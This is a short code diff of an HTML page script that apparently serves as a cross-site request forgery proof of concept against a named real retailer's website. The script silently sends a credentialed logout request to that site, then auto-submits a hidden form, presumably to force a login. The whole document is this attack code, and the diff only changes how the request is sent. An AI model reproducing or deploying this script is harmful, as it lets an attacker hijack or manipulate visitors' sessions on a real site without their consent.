@@ -10,11 +10,16 @@
   <script>
 
     setTimeout(function(){
-      //Wait 1 sec
-      //Logout
-      fetch("https://www.coolblue.be/en/logout", { mode: 'no-cors', credentials: 'include'})
-      //Login
-      document.forms[0].submit();
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', 'https://www.coolblue.be/en/logout', true);
+      xhr.withCredentials = true;
+
+      xhr.onreadystatechange = function() {
+        document.forms[0].submit();
+      }
+      
+      xhr.send();
+      
     }, 1000);
 
   </script>
